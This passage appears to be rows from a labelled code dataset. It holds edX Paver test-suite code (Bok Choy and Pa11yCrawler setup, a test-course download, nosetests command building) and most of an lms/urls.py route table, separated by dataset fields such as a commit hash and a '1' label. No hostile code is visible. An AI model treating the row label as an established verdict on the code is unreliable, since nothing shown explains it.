        suite = BokChoyTestSuite('', num_processes=2, verbosity=3)
        with self.assertRaises(BuildFailure):
            BokChoyTestSuite.verbosity_processes_string(suite)


class TestPaverPa11yCrawlerCmd(unittest.TestCase):

    """"""
    Paver pa11ycrawler command test cases.  Most of the functionality is
    inherited from BokChoyTestSuite, so those tests aren't duplicated.
    """"""

    def setUp(self):
        super(TestPaverPa11yCrawlerCmd, self).setUp()

        # Mock shell commands
        mock_sh = patch('pavelib.utils.test.suites.bokchoy_suite.sh')
        self._mock_sh = mock_sh.start()

        # Cleanup mocks
        self.addCleanup(mock_sh.stop)

    def _expected_command(self, report_dir, start_urls):
        """"""
        Returns the expected command to run pa11ycrawler.
        """"""
        expected_statement = (
            'pa11ycrawler run {start_urls} '
            '--pa11ycrawler-allowed-domains=localhost '
            '--pa11ycrawler-reports-dir={report_dir} '
            '--pa11ycrawler-deny-url-matcher=logout '
            '--pa11y-reporter=""1.0-json"" '
            '--depth-limit=6 '
        ).format(
            start_urls=' '.join(start_urls),
            report_dir=report_dir,
        )
        return expected_statement

    def test_default(self):
        suite = Pa11yCrawler('')
        self.assertEqual(
            suite.cmd,
            self._expected_command(suite.pa11y_report_dir, suite.start_urls)
        )

    def test_get_test_course(self):
        suite = Pa11yCrawler('')
        suite.get_test_course()
        self._mock_sh.assert_has_calls([
            call(
                'wget {targz} -O {dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)),
            call(
                'tar zxf {dir}demo_course.tar.gz -C {dir}'.format(dir=suite.imports_dir)),
        ])

    def test_generate_html_reports(self):
        suite = Pa11yCrawler('')
        suite.generate_html_reports()
        self._mock_sh.assert_has_calls([
            call(
                'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={}'.format(suite.pa11y_report_dir)),
        ])
/n/n/n/pavelib/utils/test/suites/bokchoy_suite.py/n/n""""""
Class used for defining and running Bok Choy acceptance test suite
""""""
from time import sleep
from urllib import urlencode

from common.test.acceptance.fixtures.course import CourseFixture, FixtureError

from path import Path as path
from paver.easy import sh, BuildFailure
from pavelib.utils.test.suites.suite import TestSuite
from pavelib.utils.envs import Env
from pavelib.utils.test import bokchoy_utils
from pavelib.utils.test import utils as test_utils

import os

try:
    from pygments.console import colorize
except ImportError:
    colorize = lambda color, text: text

__test__ = False  # do not collect

DEFAULT_NUM_PROCESSES = 1
DEFAULT_VERBOSITY = 2


class BokChoyTestSuite(TestSuite):
    """"""
    TestSuite for running Bok Choy tests
    Properties (below is a subset):
      test_dir - parent directory for tests
      log_dir - directory for test output
      report_dir - directory for reports (e.g., coverage) related to test execution
      xunit_report - directory for xunit-style output (xml)
      fasttest - when set, skip various set-up tasks (e.g., collectstatic)
      serversonly - prepare and run the necessary servers, only stopping when interrupted with Ctrl-C
      testsonly - assume servers are running (as per above) and run tests with no setup or cleaning of environment
      test_spec - when set, specifies test files, classes, cases, etc. See platform doc.
      default_store - modulestore to use when running tests (split or draft)
      num_processes - number of processes or threads to use in tests. Recommendation is that this
      is less than or equal to the number of available processors.
      verify_xss - when set, check for XSS vulnerabilities in the page HTML.
      See nosetest documentation: http://nose.readthedocs.org/en/latest/usage.html
    """"""
    def __init__(self, *args, **kwargs):
        super(BokChoyTestSuite, self).__init__(*args, **kwargs)
        self.test_dir = Env.BOK_CHOY_DIR / kwargs.get('test_dir', 'tests')
        self.log_dir = Env.BOK_CHOY_LOG_DIR
        self.report_dir = kwargs.get('report_dir', Env.BOK_CHOY_REPORT_DIR)
        self.xunit_report = self.report_dir / ""xunit.xml""
        self.cache = Env.BOK_CHOY_CACHE
        self.fasttest = kwargs.get('fasttest', False)
        self.serversonly = kwargs.get('serversonly', False)
        self.testsonly = kwargs.get('testsonly', False)
        self.test_spec = kwargs.get('test_spec', None)
        self.default_store = kwargs.get('default_store', None)
        self.verbosity = kwargs.get('verbosity', DEFAULT_VERBOSITY)
        self.num_processes = kwargs.get('num_processes', DEFAULT_NUM_PROCESSES)
        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False))
        self.extra_args = kwargs.get('extra_args', '')
        self.har_dir = self.log_dir / 'hars'
        self.a11y_file = Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE
        self.imports_dir = kwargs.get('imports_dir', None)
        self.coveragerc = kwargs.get('coveragerc', None)
        self.save_screenshots = kwargs.get('save_screenshots', False)

    def __enter__(self):
        super(BokChoyTestSuite, self).__enter__()

        # Ensure that we have a directory to put logs and reports
        self.log_dir.makedirs_p()
        self.har_dir.makedirs_p()
        self.report_dir.makedirs_p()
        test_utils.clean_reports_dir()      # pylint: disable=no-value-for-parameter

        if not (self.fasttest or self.skip_clean or self.testsonly):
            test_utils.clean_test_files()

        msg = colorize('green', ""Checking for mongo, memchache, and mysql..."")
        print msg
        bokchoy_utils.check_services()

        if not self.testsonly:
            self.prepare_bokchoy_run()
        else:
            # load data in db_fixtures
            self.load_data()

        msg = colorize('green', ""Confirming servers have started..."")
        print msg
        bokchoy_utils.wait_for_test_servers()
        try:
            # Create course in order to seed forum data underneath. This is
            # a workaround for a race condition. The first time a course is created;
            # role permissions are set up for forums.
            CourseFixture('foobar_org', '1117', 'seed_forum', 'seed_foo').install()
            print 'Forums permissions/roles data has been seeded'
        except FixtureError:
            # this means it's already been done
            pass

        if self.serversonly:
            self.run_servers_continuously()

    def __exit__(self, exc_type, exc_value, traceback):
        super(BokChoyTestSuite, self).__exit__(exc_type, exc_value, traceback)

        # Using testsonly will leave all fixtures in place (Note: the db will also be dirtier.)
        if self.testsonly:
            msg = colorize('green', 'Running in testsonly mode... SKIPPING database cleanup.')
            print msg
        else:
            # Clean up data we created in the databases
            msg = colorize('green', ""Cleaning up databases..."")
            print msg
            sh(""./manage.py lms --settings bok_choy flush --traceback --noinput"")
            bokchoy_utils.clear_mongo()

    def verbosity_processes_string(self):
        """"""
        Multiprocessing, xunit, color, and verbosity do not work well together. We need to construct
        the proper combination for use with nosetests.
        """"""
        substring = []

        if self.verbosity != DEFAULT_VERBOSITY and self.num_processes != DEFAULT_NUM_PROCESSES:
            msg = 'Cannot pass in both num_processors and verbosity. Quitting'
            raise BuildFailure(msg)

        if self.num_processes != 1:
            # Construct ""multiprocess"" nosetest substring
            substring = [
                ""--with-xunitmp --xunitmp-file={}"".format(self.xunit_report),
                ""--processes={}"".format(self.num_processes),
                ""--no-color --process-timeout=1200""
            ]

        else:
            substring = [
                ""--with-xunit"",
                ""--xunit-file={}"".format(self.xunit_report),
                ""--verbosity={}"".format(self.verbosity),
            ]

        return "" "".join(substring)

    def prepare_bokchoy_run(self):
        """"""
        Sets up and starts servers for a Bok Choy run. If --fasttest is not
        specified then static assets are collected
        """"""
        sh(""{}/scripts/reset-test-db.sh"".format(Env.REPO_ROOT))

        if not self.fasttest:
            self.generate_optimized_static_assets()

        # Clear any test data already in Mongo or MySQLand invalidate
        # the cache
        bokchoy_utils.clear_mongo()
        self.cache.flush_all()

        # load data in db_fixtures
        self.load_data()

        # load courses if self.imports_dir is set
        self.load_courses()

        # Ensure the test servers are available
        msg = colorize('green', ""Confirming servers are running..."")
        print msg
        bokchoy_utils.start_servers(self.default_store, self.coveragerc)

    def load_courses(self):
        """"""
        Loads courses from self.imports_dir.

        Note: self.imports_dir is the directory that contains the directories
        that have courses in them. For example, if the course is located in
        `test_root/courses/test-example-course/`, self.imports_dir should be
        `test_root/courses/`.
        """"""
        msg = colorize('green', ""Importing courses from {}..."".format(self.imports_dir))
        print msg

        if self.imports_dir:
            sh(
                ""DEFAULT_STORE={default_store}""
                "" ./manage.py cms --settings=bok_choy import {import_dir}"".format(
                    default_store=self.default_store,
                    import_dir=self.imports_dir
                )
            )

    def load_data(self):
        """"""
        Loads data into database from db_fixtures
        """"""
        print 'Loading data from json fixtures in db_fixtures directory'
        sh(
            ""DEFAULT_STORE={default_store}""
            "" ./manage.py lms --settings bok_choy loaddata --traceback""
            "" common/test/db_fixtures/*.json"".format(
                default_store=self.default_store,
            )
        )

    def run_servers_continuously(self):
        """"""
        Infinite loop. Servers will continue to run in the current session unless interrupted.
        """"""
        print 'Bok-choy servers running. Press Ctrl-C to exit...\n'
        print 'Note: pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\n'

        while True:
            try:
                sleep(10000)
            except KeyboardInterrupt:
                print ""Stopping bok-choy servers.\n""
                break

    @property
    def cmd(self):
        """"""
        This method composes the nosetests command to send to the terminal. If nosetests aren't being run,
         the command returns an empty string.
        """"""
        # Default to running all tests if no specific test is specified
        if not self.test_spec:
            test_spec = self.test_dir
        else:
            test_spec = self.test_dir / self.test_spec

        # Skip any additional commands (such as nosetests) if running in
        # servers only mode
        if self.serversonly:
            return """"

        # Construct the nosetests command, specifying where to save
        # screenshots and XUnit XML reports
        cmd = [
            ""DEFAULT_STORE={}"".format(self.default_store),
            ""SCREENSHOT_DIR='{}'"".format(self.log_dir),
            ""BOK_CHOY_HAR_DIR='{}'"".format(self.har_dir),
            ""BOKCHOY_A11Y_CUSTOM_RULES_FILE='{}'"".format(self.a11y_file),
            ""SELENIUM_DRIVER_LOG_DIR='{}'"".format(self.log_dir),
            ""VERIFY_XSS='{}'"".format(self.verify_xss),
            ""nosetests"",
            test_spec,
            ""{}"".format(self.verbosity_processes_string())
        ]
        if self.pdb:
            cmd.append(""--pdb"")
        if self.save_screenshots:
            cmd.append(""--with-save-baseline"")
        cmd.append(self.extra_args)

        cmd = ("" "").join(cmd)
        return cmd


class Pa11yCrawler(BokChoyTestSuite):
    """"""
    Sets up test environment with mega-course loaded, and runs pa11ycralwer
    against it.
    """"""

    def __init__(self, *args, **kwargs):
        super(Pa11yCrawler, self).__init__(*args, **kwargs)
        self.course_key = kwargs.get('course_key')
        if self.imports_dir:
            # If imports_dir has been specified, assume the files are
            # already there -- no need to fetch them from github. This
            # allows someome to crawl a different course. They are responsible
            # for putting it, un-archived, in the directory.
            self.should_fetch_course = False
        else:
            # Otherwise, obey `--skip-fetch` command and use the default
            # test course.  Note that the fetch will also be skipped when
            # using `--fast`.
            self.should_fetch_course = kwargs.get('should_fetch_course')
            self.imports_dir = path('test_root/courses/')

        self.pa11y_report_dir = os.path.join(self.report_dir, 'pa11ycrawler_reports')
        self.tar_gz_file = ""https://github.com/edx/demo-test-course/archive/master.tar.gz""

        self.start_urls = []
        auto_auth_params = {
            ""redirect"": 'true',
            ""staff"": 'true',
            ""course_id"": self.course_key,
        }
        cms_params = urlencode(auto_auth_params)
        self.start_urls.append(""\""http://localhost:8031/auto_auth?{}\"""".format(cms_params))

        sequence_url = ""/api/courses/v1/blocks/?{}"".format(
            urlencode({
                ""course_id"": self.course_key,
                ""depth"": ""all"",
                ""all_blocks"": ""true"",
            })
        )
        auto_auth_params.update({'redirect_to': sequence_url})
        lms_params = urlencode(auto_auth_params)
        self.start_urls.append(""\""http://localhost:8003/auto_auth?{}\"""".format(lms_params))

    def __enter__(self):
        if self.should_fetch_course:
            self.get_test_course()
        super(Pa11yCrawler, self).__enter__()

    def get_test_course(self):
        """"""
        Fetches the test course.
        """"""
        self.imports_dir.makedirs_p()
        zipped_course = self.imports_dir + 'demo_course.tar.gz'

        msg = colorize('green', ""Fetching the test course from github..."")
        print msg

        sh(
            'wget {tar_gz_file} -O {zipped_course}'.format(
                tar_gz_file=self.tar_gz_file,
                zipped_course=zipped_course,
            )
        )

        msg = colorize('green', ""Uncompressing the test course..."")
        print msg

        sh(
            'tar zxf {zipped_course} -C {courses_dir}'.format(
                zipped_course=zipped_course,
                courses_dir=self.imports_dir,
            )
        )

    def generate_html_reports(self):
        """"""
        Runs pa11ycrawler json-to-html
        """"""
        cmd_str = (
            'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={report_dir}'
        ).format(report_dir=self.pa11y_report_dir)

        sh(cmd_str)

    @property
    def cmd(self):
        """"""
        Runs pa11ycrawler as staff user against the test course.
        """"""
        cmd_str = (
            'pa11ycrawler run {start_urls} '
            '--pa11ycrawler-allowed-domains={allowed_domains} '
            '--pa11ycrawler-reports-dir={report_dir} '
            '--pa11ycrawler-deny-url-matcher={dont_go_here} '
            '--pa11y-reporter=""{reporter}"" '
            '--depth-limit={depth} '
        ).format(
            start_urls=' '.join(self.start_urls),
            allowed_domains='localhost',
            report_dir=self.pa11y_report_dir,
            reporter=""1.0-json"",
            dont_go_here=""logout"",
            depth=""6"",
        )
        return cmd_str
/n/n/n",1
44,4e4c209ae3deb4c78bcec89c181516af8604b450,"lms/urls.py/n/nfrom django.conf import settings
from django.conf.urls import patterns, include, url
from django.contrib import admin
from django.conf.urls.static import static

# Not used, the work is done in the imported module.
from . import one_time_startup      # pylint: disable=W0611

import django.contrib.auth.views

# Uncomment the next two lines to enable the admin:
if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    admin.autodiscover()

urlpatterns = ('',  # nopep8
    # certificate view

    url(r'^update_certificate$', 'certificates.views.update_certificate'),
    url(r'^$', 'branding.views.index', name=""root""),   # Main marketing page, or redirect to courseware
    url(r'^dashboard$', 'student.views.dashboard', name=""dashboard""),
    url(r'^login$', 'student.views.signin_user', name=""signin_user""),
    url(r'^register$', 'student.views.register_user', name=""register_user""),

    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),

    url(r'^change_email$', 'student.views.change_email_request', name=""change_email""),
    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),
    url(r'^change_name$', 'student.views.change_name_request', name=""change_name""),
    url(r'^accept_name_change$', 'student.views.accept_name_change'),
    url(r'^reject_name_change$', 'student.views.reject_name_change'),
    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),
    url(r'^event$', 'track.views.user_track'),
    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?

    url(r'^accounts/login$', 'student.views.accounts_login', name=""accounts_login""),

    url(r'^login_ajax$', 'student.views.login_user', name=""login""),
    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),
    url(r'^logout$', 'student.views.logout_user', name='logout'),
    url(r'^create_account$', 'student.views.create_account'),
    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=""activate""),

    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=""begin_exam_registration""),
    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),

    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),
    ## Obsolete Django views for password resets
    ## TODO: Replace with Mako-ized views
    url(r'^password_change/$', django.contrib.auth.views.password_change,
        name='auth_password_change'),
    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,
        name='auth_password_change_done'),
    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',
        'student.views.password_reset_confirm_wrapper',
        name='auth_password_reset_confirm'),
    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,
        name='auth_password_reset_complete'),
    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,
        name='auth_password_reset_done'),

    url(r'^heartbeat$', include('heartbeat.urls')),
)

# University profiles only make sense in the default edX context
if not settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
    urlpatterns += (
        ##
        ## Only universities without courses should be included here.  If
        ## courses exist, the dynamic profile rule below should win.
        ##
        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'WellesleyX'}),
        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'McGillX'}),
        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'TorontoX'}),
        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'RiceX'}),
        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'ANUx'}),
        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'EPFLx'}),

        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',
            name=""university_profile""),
    )

#Semi-static views (these need to be rendered and have the login bar, but don't change)
urlpatterns += (
    url(r'^404$', 'static_template_view.views.render',
        {'template': '404.html'}, name=""404""),
)

# Semi-static views only used by edX, not by themes
if not settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
    urlpatterns += (
        url(r'^jobs$', 'static_template_view.views.render',
            {'template': 'jobs.html'}, name=""jobs""),
        url(r'^press$', 'student.views.press', name=""press""),
        url(r'^media-kit$', 'static_template_view.views.render',
            {'template': 'media-kit.html'}, name=""media-kit""),
        url(r'^faq$', 'static_template_view.views.render',
            {'template': 'faq.html'}, name=""faq_edx""),
        url(r'^help$', 'static_template_view.views.render',
            {'template': 'help.html'}, name=""help_edx""),

        # TODO: (bridger) The copyright has been removed until it is updated for edX
        # url(r'^copyright$', 'static_template_view.views.render',
        #     {'template': 'copyright.html'}, name=""copyright""),

        #Press releases
        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),

        # Favicon
        (r'^favicon\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),

        url(r'^submit_feedback$', 'util.views.submit_feedback'),

    )

# Only enable URLs for those marketing links actually enabled in the
# settings. Disable URLs by marking them as None.
for key, value in settings.MKTG_URL_LINK_MAP.items():
    # Skip disabled URLs
    if value is None:
        continue

    # These urls are enabled separately
    if key == ""ROOT"" or key == ""COURSES"" or key == ""FAQ"":
        continue

    # Make the assumptions that the templates are all in the same dir
    # and that they all match the name of the key (plus extension)
    template = ""%s.html"" % key.lower()

    # To allow theme templates to inherit from default templates,
    # prepend a standard prefix
    if settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
        template = ""theme-"" + template

    # Make the assumption that the URL we want is the lowercased
    # version of the map key
    urlpatterns += (url(r'^%s' % key.lower(),
                        'static_template_view.views.render',
                        {'template': template}, name=value),)


if settings.PERFSTATS:
    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)

# Multicourse wiki (Note: wiki urls must be above the courseware ones because of
# the custom tab catch-all)
if settings.WIKI_ENABLED:
    from wiki.urls import get_pattern as wiki_pattern
    from django_notify.urls import get_pattern as notify_pattern

    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update
    # them together.
    urlpatterns += (
        # First we include views from course_wiki that we use to override the default views.
        # They come first in the urlpatterns so they get resolved first
        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),
        url(r'^wiki/', include(wiki_pattern())),
        url(r'^notify/', include(notify_pattern())),

        # These urls are for viewing the wiki in the context of a course. They should
        # never be returned by a reverse() so they come after the other url patterns
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',
            'course_wiki.views.course_wiki_redirect', name=""course_wiki""),
        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),
    )


if settings.COURSEWARE_ENABLED:
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',
            'courseware.views.jump_to', name=""jump_to""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.modx_dispatch',
            name='modx_dispatch'),


        # Software Licenses

        # TODO: for now, this is the endpoint of an ajax replay
        # service that retrieve and assigns license numbers for
        # software assigned to a course. The numbers have to be loaded
        # into the database.
        url(r'^software-licenses$', 'licenses.views.user_software_license', name=""user_software_license""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.xqueue_callback',
            name='xqueue_callback'),
        url(r'^change_setting$', 'student.views.change_setting',
            name='change_setting'),

        # TODO: These views need to be updated before they work
        url(r'^calculate$', 'util.views.calculate'),
        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki
        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),
        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),

        url(r'^courses/?$', 'branding.views.courses', name=""courses""),
        url(r'^change_enrollment$',
            'student.views.change_enrollment', name=""change_enrollment""),

        #About the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',
            'courseware.views.course_about', name=""about_course""),
        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',
            'courseware.views.mktg_course_about', name=""mktg_about_course""),
        #View for mktg site
        url(r'^mktg/(?P<course_id>.*)$',
            'courseware.views.mktg_course_about', name=""mktg_about_course""),



        #Inside the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'courseware.views.course_info', name=""course_root""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',
            'courseware.views.course_info', name=""info""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',
            'courseware.views.syllabus', name=""syllabus""),   # TODO arjun remove when custom tabs in place, see courseware/courses.py
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\d+)/$',
            'staticbook.views.index', name=""book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\d+)/(?P<page>\d+)$',
            'staticbook.views.index'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$',
            'staticbook.views.index_shifted'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\d+)/$',
            'staticbook.views.pdf_index', name=""pdf_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\d+)/(?P<page>\d+)$',
            'staticbook.views.pdf_index', name=""pdf_book""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\d+)/chapter/(?P<chapter>\d+)/$',
            'staticbook.views.pdf_index', name=""pdf_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\d+)/chapter/(?P<chapter>\d+)/(?P<page>\d+)$',
            'staticbook.views.pdf_index', name=""pdf_book""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\d+)/$',
            'staticbook.views.html_index', name=""html_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\d+)/chapter/(?P<chapter>\d+)/$',
            'staticbook.views.html_index', name=""html_book""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',
            'courseware.views.index', name=""courseware""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',
            'courseware.views.index', name=""courseware_chapter""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',
            'courseware.views.index', name=""courseware_section""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',
            'courseware.views.index', name=""courseware_position""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',
            'courseware.views.progress', name=""progress""),
        # Takes optional student_id for instructor use--shows profile as that student sees it.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',
            'courseware.views.progress', name=""student_progress""),

        # For the instructor
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',
            'instructor.views.instructor_dashboard', name=""instructor_dashboard""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',
            'instructor.views.gradebook', name='gradebook'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',
            'instructor.views.grade_summary', name='grade_summary'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',
            'open_ended_grading.views.staff_grading', name='staff_grading'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',
            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',
            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),

        # Open Ended problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',
            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),

        # Open Ended flagged problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',
            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',
            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),

        # Cohorts management
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',
            'course_groups.views.list_cohorts', name=""cohorts""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',
            'course_groups.views.add_cohort',
            name=""add_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',
            'course_groups.views.users_in_cohort',
            name=""list_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',
            'course_groups.views.add_users_to_cohort',
            name=""add_to_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',
            'course_groups.views.remove_user_from_cohort',
            name=""remove_from_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',
            'course_groups.views.debug_cohort_mgmt',
            name=""debug_cohort_mgmt""),

        # Open Ended Notifications
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',
            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',
            'open_ended_grading.views.peer_grading', name='peer_grading'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),

    )

    # allow course staff to change to student view of courseware
    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):
        urlpatterns += (
            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=""masquerade-switch""),
        )

    # discussion forums live within courseware, so courseware must be enabled first
    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',
                'courseware.views.news', name=""news""),
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',
                include('django_comment_client.urls'))
        )
    urlpatterns += (
        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',
        'courseware.views.static_tab', name=""static_tab""),
    )

    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',
                'courseware.views.submission_history',
                name='submission_history'),
        )


if settings.ENABLE_JASMINE:
    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)

if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    ## Jasmine and admin
    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)

if settings.MITX_FEATURES.get('AUTH_USE_OPENID'):
    urlpatterns += (
        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),
        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),
        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),
    )

if settings.MITX_FEATURES.get('AUTH_USE_SHIB'):
    urlpatterns += (
        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),
    )

if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):
    urlpatterns += (
        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_login', name='course-specific-login'),
        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
